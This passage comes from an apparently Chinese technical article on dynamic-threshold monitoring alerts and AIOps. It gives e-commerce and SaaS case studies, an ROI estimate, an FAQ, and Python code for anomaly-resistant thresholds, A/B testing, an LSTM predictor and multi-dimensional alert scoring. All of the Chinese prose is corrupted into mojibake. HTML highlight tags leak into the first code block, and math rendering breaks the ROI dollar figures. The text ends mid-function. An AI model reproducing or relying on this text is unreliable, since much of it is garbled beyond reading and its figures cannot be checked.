    
    def _render_recent_alerts(self):
        """æ¸²æŸ“æœ€è¿‘å‘Šè­¦åˆ—è¡¨"""
        <span class="hljs-attr">alerts</span> = self._fetch_recent_alerts(limit=<span class="hljs-number">10</span>)
        
        <span class="hljs-attr">df</span> = pd.DataFrame(alerts)
        df<span class="hljs-section">['timestamp']</span> = pd.to_datetime(df<span class="hljs-section">['timestamp']</span>)
        
        st.dataframe(
            df<span class="hljs-section">[['timestamp', 'metric', 'severity', 'deviation', 'confidence']]</span>,
            <span class="hljs-attr">use_container_width</span>=<span class="hljs-literal">True</span>
        )
</code></pre>
<h2 data-id="heading-25">å…­ã€çœŸå®æ¡ˆä¾‹ä¸æ•ˆæœè¯„ä¼°</h2>
<h3 data-id="heading-26">6.1 æ¡ˆä¾‹ä¸€ï¼šæŸç”µå•†å¹³å°</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>æ—¥å‡PV 5000ä¸‡</li>
<li>å¾®æœåŠ¡æ¶æ„ï¼Œ200+æœåŠ¡å®ä¾‹</li>
<li>åŸæœ‰å›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿæ¯å¤©äº§ç”Ÿ800+å‘Šè­¦</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>ä¸ºæ ¸å¿ƒæœåŠ¡ï¼ˆè®¢å•ã€æ”¯ä»˜ã€åº“å­˜ï¼‰éƒ¨ç½²åŠ¨æ€é˜ˆå€¼</li>
<li>é…ç½®7å¤©æ»‘åŠ¨çª—å£ï¼Œ24å°æ—¶å­£èŠ‚å‘¨æœŸ</li>
<li>æ³¨å†ŒåŒ11ã€618ç­‰å¤§ä¿ƒäº‹ä»¶</li>
</ol>
<p>æ•ˆæœå¯¹æ¯”ï¼š</p>









































<table><thead><tr><th>æŒ‡æ ‡</th><th>å®æ–½å‰</th><th>å®æ–½å</th><th>æ”¹å–„å¹…åº¦</th></tr></thead><tbody><tr><td>æ—¥å‡å‘Šè­¦æ•°</td><td>823</td><td>287</td><td>-65%</td></tr><tr><td>æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹</td><td>22%</td><td>68%</td><td>+209%</td></tr><tr><td>å¹³å‡å“åº”æ—¶é—´</td><td>18åˆ†é’Ÿ</td><td>6åˆ†é’Ÿ</td><td>-67%</td></tr><tr><td>è¯¯æŠ¥ç‡</td><td>78%</td><td>32%</td><td>-59%</td></tr><tr><td>æ•…éšœå‘ç°æ—¶é—´</td><td>å¹³å‡15åˆ†é’Ÿ</td><td>å¹³å‡3åˆ†é’Ÿ</td><td>-80%</td></tr></tbody></table>
<p>å…³é”®æ”¶ç›Šï¼š</p>
<ul>
<li>è¿ç»´äººå‘˜ä»"æ•‘ç«"è½¬å‘"ä¼˜åŒ–"</li>
<li>åŒ11æœŸé—´é›¶è¯¯æŠ¥ï¼Œæ‰€æœ‰å‘Šè­¦å‡ä¸ºçœŸå®é—®é¢˜</li>
<li>æå‰å‘ç°äº†3æ¬¡æ½œåœ¨çš„ç³»ç»Ÿç“¶é¢ˆ</li>
</ul>
<h3 data-id="heading-27">6.2 æ¡ˆä¾‹äºŒï¼šæŸSaaSå…¬å¸</h3>
<p>èƒŒæ™¯ï¼š</p>
<ul>
<li>B2B SaaSäº§å“ï¼Œå®¢æˆ·éå¸ƒå…¨çƒ</li>
<li>ä¸šåŠ¡å¢é•¿è¿…é€Ÿï¼ˆæœˆå¢é•¿30%ï¼‰</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•é€‚åº”å¿«é€Ÿå¢é•¿</li>
</ul>
<p>å®æ–½æ–¹æ¡ˆï¼š</p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ</li>
<li>é›†æˆè¿ç»´äººå‘˜åé¦ˆæœºåˆ¶</li>
<li>æŒ‰å®¢æˆ·æ—¶åŒºé…ç½®ä¸åŒçš„å­£èŠ‚å‘¨æœŸ</li>
</ol>
<p>æ•ˆæœï¼š</p>
<ul>
<li>3ä¸ªæœˆå†…ï¼Œç³»ç»Ÿè‡ªåŠ¨å°†sigmaå€æ•°ä»3.0è°ƒæ•´åˆ°3.8</li>
<li>å‘Šè­¦å‡†ç¡®ç‡ä»45%æå‡åˆ°82%</li>
<li>æˆåŠŸé€‚åº”äº†ä¸šåŠ¡ä»10ä¸‡ç”¨æˆ·åˆ°50ä¸‡ç”¨æˆ·çš„å¢é•¿</li>
</ul>
<h3 data-id="heading-28">6.3 æŠ•èµ„å›æŠ¥ç‡ï¼ˆROIï¼‰åˆ†æ</h3>
<p>æˆæœ¬ï¼š</p>
<ul>
<li>å¼€å‘æˆæœ¬ï¼š2äººæœˆ</li>
<li>åŸºç¡€è®¾æ–½æˆæœ¬ï¼šæ—¶åºæ•°æ®åº“å­˜å‚¨ $200/æœˆ</li>
<li>ç»´æŠ¤æˆæœ¬ï¼š0.5äººæœˆ/å¹´</li>
</ul>
<p>æ”¶ç›Šï¼ˆå¹´åŒ–ï¼‰ï¼š</p>
<ul>
<li>å‡å°‘è¯¯æŠ¥èŠ‚çœçš„äººåŠ›ï¼š800å°æ—¶ Ã— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>50</mn><mi mathvariant="normal">/</mi><mtext>å°æ—¶</mtext><mo>=</mo></mrow><annotation encoding="application/x-tex">50/å°æ—¶ = </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">50/</span><span class="mord cjk_fallback">å°æ—¶</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span></span></span></span></span>40,000</li>
<li>æå‰å‘ç°æ•…éšœé¿å…çš„æŸå¤±ï¼šä¼°ç®— $100,000</li>
<li>æå‡è¿ç»´æ•ˆç‡çš„ä»·å€¼ï¼š$50,000</li>
</ul>
<p>ROI = (æ”¶ç›Š - æˆæœ¬) / æˆæœ¬ Ã— 100%</p>
<p>ROI = (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>190</mn><mo separator="true">,</mo><mn>000</mn><mo>âˆ’</mo></mrow><annotation encoding="application/x-tex">190,000 - </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"/><span class="mord">190</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord">âˆ’</span></span></span></span></span>12,400) / $12,400 Ã— 100% = 1,432%</p>
<h2 data-id="heading-29">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-30">Q1: åŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼š"ä¹ æƒ¯"å¼‚å¸¸çŠ¶æ€ï¼Ÿ</h3>
<p>é—®é¢˜æè¿°ï¼šå¦‚æœç³»ç»Ÿé•¿æœŸå¤„äºå¼‚å¸¸çŠ¶æ€ï¼ˆå¦‚å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜æŒç»­ä¸Šå‡ï¼‰ï¼ŒåŠ¨æ€é˜ˆå€¼ä¼šä¸ä¼šé€æ¸é€‚åº”è¿™ç§å¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•å‘Šè­¦ï¼Ÿ</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnomalyResistantThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""æŠ—å¼‚å¸¸æ±¡æŸ“çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""å¢å¼ºçš„é¢„å¤„ç†ï¼šæ£€æµ‹å¹¶ç§»é™¤æŒç»­å¼‚å¸¸"""</span>
        <span class="hljs-comment"># 1. åŸºç¡€é¢„å¤„ç†</span>
        values = <span class="hljs-built_in">super</span>()._preprocess_series(values)
        
        <span class="hljs-comment"># 2. æ£€æµ‹æŒç»­ä¸Šå‡è¶‹åŠ¿ï¼ˆå¯èƒ½æ˜¯å†…å­˜æ³„æ¼ï¼‰</span>
        <span class="hljs-keyword">if</span> self._detect_sustained_increase(values):
            <span class="hljs-comment"># ä½¿ç”¨æ›´æ—©æœŸçš„"å¥åº·"æ•°æ®</span>
            healthy_baseline = np.percentile(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>], <span class="hljs-number">75</span>)
            <span class="hljs-comment"># å°†å¼‚å¸¸ä¸Šå‡éƒ¨åˆ†æ‹‰å›åˆ°å¥åº·åŸºçº¿</span>
            values = np.minimum(values, healthy_baseline * <span class="hljs-number">1.2</span>)
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_sustained_increase</span>(<span class="hljs-params">self, values, threshold=<span class="hljs-number">0.5</span></span>):
        <span class="hljs-string">"""æ£€æµ‹æŒç»­ä¸Šå‡ï¼ˆå¯èƒ½çš„å†…å­˜æ³„æ¼ç­‰ï¼‰"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) &lt; <span class="hljs-number">48</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒå‰åä¸¤åŠçš„å‡å€¼</span>
        first_half_mean = np.mean(values[:<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>])
        second_half_mean = np.mean(values[<span class="hljs-built_in">len</span>(values)//<span class="hljs-number">2</span>:])
        
        increase_rate = (second_half_mean - first_half_mean) / first_half_mean
        
        <span class="hljs-keyword">return</span> increase_rate &gt; threshold
</code></pre>
<h3 data-id="heading-31">Q2: å¦‚ä½•å¤„ç†çªå‘æµé‡ï¼ˆå¦‚çƒ­ç‚¹äº‹ä»¶ï¼‰ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šç»“åˆå®æ—¶æµé‡é¢„æµ‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficAwareDynamicThreshold</span>:
    <span class="hljs-string">"""æµé‡æ„ŸçŸ¥çš„åŠ¨æ€é˜ˆå€¼"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_gen, traffic_predictor</span>):
        self.threshold_gen = threshold_gen
        self.traffic_predictor = traffic_predictor
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_for_traffic</span>(<span class="hljs-params">self, base_thresholds, current_traffic</span>):
        <span class="hljs-string">"""æ ¹æ®å®æ—¶æµé‡è°ƒæ•´é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æµ‹çš„æ­£å¸¸æµé‡</span>
        expected_traffic = self.traffic_predictor.predict()
        
        <span class="hljs-comment"># æµé‡å€æ•°</span>
        traffic_multiplier = current_traffic / expected_traffic
        
        <span class="hljs-keyword">if</span> traffic_multiplier &gt; <span class="hljs-number">2.0</span>:
            <span class="hljs-comment"># æµé‡æ¿€å¢ï¼Œæ”¾å®½é˜ˆå€¼</span>
            adjusted_thresholds = {
                <span class="hljs-string">'upper'</span>: base_thresholds[<span class="hljs-string">'upper'</span>] * traffic_multiplier * <span class="hljs-number">0.8</span>,
                <span class="hljs-string">'lower'</span>: base_thresholds[<span class="hljs-string">'lower'</span>],
                <span class="hljs-string">'note'</span>: <span class="hljs-string">f'æ£€æµ‹åˆ°<span class="hljs-subst">{traffic_multiplier:<span class="hljs-number">.1</span>f}</span>å€æµé‡ï¼Œé˜ˆå€¼å·²è°ƒæ•´'</span>
            }
            <span class="hljs-keyword">return</span> adjusted_thresholds
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<h3 data-id="heading-32">Q3: æ•°æ®ä¸è¶³æ—¶å¦‚ä½•å¤„ç†ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šåˆ†å±‚é™çº§ç­–ç•¥</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_threshold_with_fallback</span>(<span class="hljs-params">metric_name, current_value, history_length</span>):
    <span class="hljs-string">"""åˆ†å±‚é™çº§çš„é˜ˆå€¼è·å–"""</span>
    <span class="hljs-keyword">if</span> history_length &gt;= <span class="hljs-number">168</span>:
        <span class="hljs-comment"># å±‚çº§1ï¼šå®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ï¼ˆæœ€ä¼˜ï¼‰</span>
        <span class="hljs-keyword">return</span> dynamic_threshold_generator.get_thresholds()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">48</span>:
        <span class="hljs-comment"># å±‚çº§2ï¼šç®€åŒ–çš„åŠ¨æ€é˜ˆå€¼ï¼ˆä½¿ç”¨ç§»åŠ¨å¹³å‡ï¼‰</span>
        <span class="hljs-keyword">return</span> simple_moving_average_threshold()
    <span class="hljs-keyword">elif</span> history_length &gt;= <span class="hljs-number">12</span>:
        <span class="hljs-comment"># å±‚çº§3ï¼šåŸºäºç™¾åˆ†ä½æ•°çš„é˜ˆå€¼</span>
        <span class="hljs-keyword">return</span> percentile_based_threshold(percentile=<span class="hljs-number">95</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># å±‚çº§4ï¼šä½¿ç”¨è¡Œä¸šé»˜è®¤å€¼</span>
        <span class="hljs-keyword">return</span> get_industry_default_threshold(metric_name)
</code></pre>
<h3 data-id="heading-33">Q4: å¦‚ä½•éªŒè¯åŠ¨æ€é˜ˆå€¼çš„æœ‰æ•ˆæ€§ï¼Ÿ</h3>
<p>è§£å†³æ–¹æ¡ˆï¼šA/Bæµ‹è¯•æ¡†æ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ABTestingFramework</span>:
    <span class="hljs-string">"""A/Bæµ‹è¯•æ¡†æ¶"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.group_a_metrics = []  <span class="hljs-comment"># å›ºå®šé˜ˆå€¼ç»„</span>
        self.group_b_metrics = []  <span class="hljs-comment"># åŠ¨æ€é˜ˆå€¼ç»„</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_test</span>(<span class="hljs-params">self, duration_days=<span class="hljs-number">30</span></span>):
        <span class="hljs-string">"""è¿è¡ŒA/Bæµ‹è¯•"""</span>
        <span class="hljs-comment"># éšæœºåˆ†é…50%æµé‡åˆ°åŠ¨æ€é˜ˆå€¼</span>
        <span class="hljs-keyword">for</span> metric <span class="hljs-keyword">in</span> all_metrics:
            <span class="hljs-keyword">if</span> random.random() &lt; <span class="hljs-number">0.5</span>:
                use_dynamic_threshold(metric)
                self.group_b_metrics.append(metric)
            <span class="hljs-keyword">else</span>:
                use_fixed_threshold(metric)
                self.group_a_metrics.append(metric)
        
        <span class="hljs-comment"># æ”¶é›†duration_dayså¤©çš„æ•°æ®</span>
        time.sleep(duration_days * <span class="hljs-number">86400</span>)
        
        <span class="hljs-comment"># ç»Ÿè®¡åˆ†æ</span>
        <span class="hljs-keyword">return</span> self.analyze_results()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_results</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ†ææµ‹è¯•ç»“æœ"""</span>
        results = {
            <span class="hljs-string">'group_a'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_a_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_a_metrics),
                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_a_metrics)
            },
            <span class="hljs-string">'group_b'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_b_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_b_metrics),
                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_b_metrics)
            }
        }
        
        <span class="hljs-comment"># ç»Ÿè®¡æ˜¾è‘—æ€§æ£€éªŒ</span>
        p_value = self._statistical_test(results)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'results'</span>: results,
            <span class="hljs-string">'is_significant'</span>: p_value &lt; <span class="hljs-number">0.05</span>,
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-string">'adopt_dynamic'</span> <span class="hljs-keyword">if</span> results[<span class="hljs-string">'group_b'</span>][<span class="hljs-string">'false_positive_rate'</span>] &lt; results[<span class="hljs-string">'group_a'</span>][<span class="hljs-string">'false_positive_rate'</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">'keep_fixed'</span>
        }
</code></pre>
<h2 data-id="heading-34">å…«ã€æœªæ¥å±•æœ›ä¸æ¼”è¿›æ–¹å‘</h2>
<h3 data-id="heading-35">8.1 æœºå™¨å­¦ä¹ å¢å¼º</h3>
<p>æ–¹å‘ä¸€ï¼šæ·±åº¦å­¦ä¹ é¢„æµ‹æ¨¡å‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LSTMThresholdPredictor</span>(nn.Module):
    <span class="hljs-string">"""åŸºäºLSTMçš„é˜ˆå€¼é¢„æµ‹å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_size=<span class="hljs-number">1</span>, hidden_size=<span class="hljs-number">64</span>, num_layers=<span class="hljs-number">2</span></span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.lstm = nn.LSTM(input_size, hidden_size, num_layers, batch_first=<span class="hljs-literal">True</span>)
        self.fc = nn.Linear(hidden_size, <span class="hljs-number">3</span>)  <span class="hljs-comment"># é¢„æµ‹ï¼šæœŸæœ›å€¼ã€ä¸Šç•Œã€ä¸‹ç•Œ</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):
        lstm_out, _ = self.lstm(x)
        predictions = self.fc(lstm_out[:, -<span class="hljs-number">1</span>, :])
        <span class="hljs-keyword">return</span> predictions
</code></pre>
<p>æ–¹å‘äºŒï¼šå¼‚å¸¸æ£€æµ‹ç®—æ³•èåˆ</p>
<ul>
<li>Isolation Forestï¼šæ£€æµ‹ç¦»ç¾¤ç‚¹</li>
<li>Autoencoderï¼šå­¦ä¹ æ­£å¸¸æ¨¡å¼</li>
<li>One-Class SVMï¼šå•ç±»åˆ†ç±»</li>
</ul>
<h3 data-id="heading-36">8.2 AIOpsé›†æˆ</h3>
<p>åŠ¨æ€é˜ˆå€¼ â†’ å¼‚å¸¸æ£€æµ‹ â†’ æ ¹å› åˆ†æ â†’ è‡ªåŠ¨ä¿®å¤</p>
<p>å®Œæ•´çš„AIOpsé—­ç¯ï¼š</p>
<ol>
<li>æ£€æµ‹ï¼šåŠ¨æ€é˜ˆå€¼å‘ç°å¼‚å¸¸</li>
<li>è¯Šæ–­ï¼šå…³è”åˆ†ææ‰¾åˆ°æ ¹å› </li>
<li><strong>é¢„æµ‹</strong>ï¼šé¢„æµ‹æ•…éšœå‘å±•è¶‹åŠ¿<br/>
4.<strong>å†³ç­–</strong>ï¼šæ¨èä¿®å¤æ–¹æ¡ˆ<br/>
5.<strong>æ‰§è¡Œ</strong>ï¼šè‡ªåŠ¨åŒ–ä¿®å¤<br/>
6.<strong>å­¦ä¹ </strong>ï¼šä»ç»“æœä¸­æŒç»­ä¼˜åŒ–</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIOpsEngine</span>:
    <span class="hljs-string">"""AIOpsæ™ºèƒ½è¿ç»´å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.anomaly_detector = DynamicThresholdGenerator()
        self.root_cause_analyzer = RootCauseAnalyzer()
        self.failure_predictor = FailurePredictor()
        self.auto_remediation = AutoRemediationEngine()
        self.knowledge_base = KnowledgeBase()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_anomaly</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""å¤„ç†å¼‚å¸¸çš„å®Œæ•´æµç¨‹"""</span>
        <span class="hljs-comment"># 1. å¼‚å¸¸æ£€æµ‹</span>
        anomaly_result = self.anomaly_detector.update_and_get_thresholds(
            metric_data[<span class="hljs-string">'value'</span>], 
            metric_data[<span class="hljs-string">'timestamp'</span>]
        )
        
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> anomaly_result[<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'normal'</span>}
        
        <span class="hljs-comment"># 2. æ ¹å› åˆ†æ</span>
        root_cause = self.root_cause_analyzer.analyze(
            anomaly_result,
            context=self._gather_context(metric_data)
        )
        
        <span class="hljs-comment"># 3. æ•…éšœé¢„æµ‹</span>
        prediction = self.failure_predictor.predict_impact(
            root_cause,
            time_horizon=<span class="hljs-number">3600</span>  <span class="hljs-comment"># é¢„æµ‹æœªæ¥1å°æ—¶</span>
        )
        
        <span class="hljs-comment"># 4. æŸ¥è¯¢çŸ¥è¯†åº“</span>
        similar_cases = self.knowledge_base.find_similar_incidents(root_cause)
        
        <span class="hljs-comment"># 5. ç”Ÿæˆä¿®å¤å»ºè®®</span>
        remediation_plan = self._generate_remediation_plan(
            root_cause, 
            prediction, 
            similar_cases
        )
        
        <span class="hljs-comment"># 6. è‡ªåŠ¨ä¿®å¤ï¼ˆå¦‚æœç½®ä¿¡åº¦è¶³å¤Ÿé«˜ï¼‰</span>
        <span class="hljs-keyword">if</span> remediation_plan[<span class="hljs-string">'confidence'</span>] &gt; <span class="hljs-number">0.8</span>:
            execution_result = self.auto_remediation.execute(
                remediation_plan[<span class="hljs-string">'actions'</span>]
            )
            
            <span class="hljs-comment"># 7. è®°å½•åˆ°çŸ¥è¯†åº“</span>
            self.knowledge_base.add_case({
                <span class="hljs-string">'anomaly'</span>: anomaly_result,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'remediation'</span>: remediation_plan,
                <span class="hljs-string">'result'</span>: execution_result,
                <span class="hljs-string">'timestamp'</span>: metric_data[<span class="hljs-string">'timestamp'</span>]
            })
            
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'auto_remediated'</span>,
                <span class="hljs-string">'actions_taken'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'result'</span>: execution_result
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ç½®ä¿¡åº¦ä¸è¶³ï¼Œå‘é€å‘Šè­¦ç»™äººå·¥å¤„ç†</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'manual_intervention_required'</span>,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'suggested_actions'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'confidence'</span>: remediation_plan[<span class="hljs-string">'confidence'</span>]
            }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_gather_context</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""æ”¶é›†ä¸Šä¸‹æ–‡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'related_metrics'</span>: self._get_related_metrics(metric_data),
            <span class="hljs-string">'recent_deployments'</span>: self._get_recent_deployments(),
            <span class="hljs-string">'system_topology'</span>: self._get_system_topology(),
            <span class="hljs-string">'historical_patterns'</span>: self._get_historical_patterns(metric_data)
        }
</code></pre>
<h3 data-id="heading-37">8.3 å¤šç»´åº¦æ™ºèƒ½å‘Šè­¦</h3>
<p><strong>ä»å•æŒ‡æ ‡åˆ°å…¨å±€è§†å›¾</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HolographicAlertingSystem</span>:
    <span class="hljs-string">"""å…¨æ¯å‘Šè­¦ç³»ç»Ÿ - å¤šç»´åº¦ç»¼åˆåˆ¤æ–­"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.dimensions = {
            <span class="hljs-string">'metric'</span>: MetricDimension(),      <span class="hljs-comment"># æŒ‡æ ‡ç»´åº¦</span>
            <span class="hljs-string">'topology'</span>: TopologyDimension(),  <span class="hljs-comment"># æ‹“æ‰‘ç»´åº¦</span>
            <span class="hljs-string">'business'</span>: BusinessDimension(),  <span class="hljs-comment"># ä¸šåŠ¡ç»´åº¦</span>
            <span class="hljs-string">'temporal'</span>: TemporalDimension()   <span class="hljs-comment"># æ—¶é—´ç»´åº¦</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_alert</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""å¤šç»´åº¦è¯„ä¼°å‘Šè­¦"""</span>
        scores = {}
        
        <span class="hljs-comment"># 1. æŒ‡æ ‡ç»´åº¦ï¼šåŠ¨æ€é˜ˆå€¼åˆ¤æ–­</span>
        scores[<span class="hljs-string">'metric'</span>] = self.dimensions[<span class="hljs-string">'metric'</span>].evaluate(event)
        
        <span class="hljs-comment"># 2. æ‹“æ‰‘ç»´åº¦ï¼šæ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        scores[<span class="hljs-string">'topology'</span>] = self.dimensions[<span class="hljs-string">'topology'</span>].evaluate(event)
        
        <span class="hljs-comment"># 3. ä¸šåŠ¡ç»´åº¦ï¼šæ˜¯å¦å½±å“æ ¸å¿ƒä¸šåŠ¡</span>
        scores[<span class="hljs-string">'business'</span>] = self.dimensions[<span class="hljs-string">'business'</span>].evaluate(event)
        
        <span class="hljs-comment"># 4. æ—¶é—´ç»´åº¦ï¼šæ˜¯å¦åœ¨å…³é”®æ—¶é—´çª—å£</span>
        scores[<span class="hljs-string">'temporal'</span>] = self.dimensions[<span class="hljs-string">'temporal'</span>].evaluate(event)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        final_score = self._weighted_score(scores)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'should_alert'</span>: final_score &gt; <span class="hljs-number">0.7</span>,
            <span class="hljs-string">'priority'</span>: self._calculate_priority(final_score),
            <span class="hljs-string">'dimension_scores'</span>: scores,
            <span class="hljs-string">'final_score'</span>: final_score,
            <span class="hljs-string">'reasoning'</span>: self._generate_reasoning(scores)
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_weighted_score</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""åŠ æƒè®¡ç®—ç»¼åˆåˆ†æ•°"""</span>
        weights = {
            <span class="hljs-string">'metric'</span>: <span class="hljs-number">0.4</span>,
            <span class="hljs-string">'topology'</span>: <span class="hljs-number">0.3</span>,
            <span class="hljs-string">'business'</span>: <span class="hljs-number">0.2</span>,
            <span class="hljs-string">'temporal'</span>: <span class="hljs-number">0.1</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(scores[dim] * weights[dim] <span class="hljs-keyword">for</span> dim <span class="hljs-keyword">in</span> scores)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_reasoning</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""ç”Ÿæˆå¯è§£é‡Šçš„å‘Šè­¦åŸå› """</span>
        reasons = []
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'metric'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"æŒ‡æ ‡ä¸¥é‡åç¦»é¢„æœŸå€¼"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'topology'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“å…³é”®æœåŠ¡é“¾è·¯"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'business'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“æ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'temporal'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"å‘ç”Ÿåœ¨ä¸šåŠ¡é«˜å³°æœŸ"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"; "</span>.join(reasons)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TopologyDimension</span>:
    <span class="hljs-string">"""æ‹“æ‰‘ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°äº‹ä»¶åœ¨æœåŠ¡æ‹“æ‰‘ä¸­çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡ä¾èµ–å›¾</span>
        dependency_graph = self._get_dependency_graph()
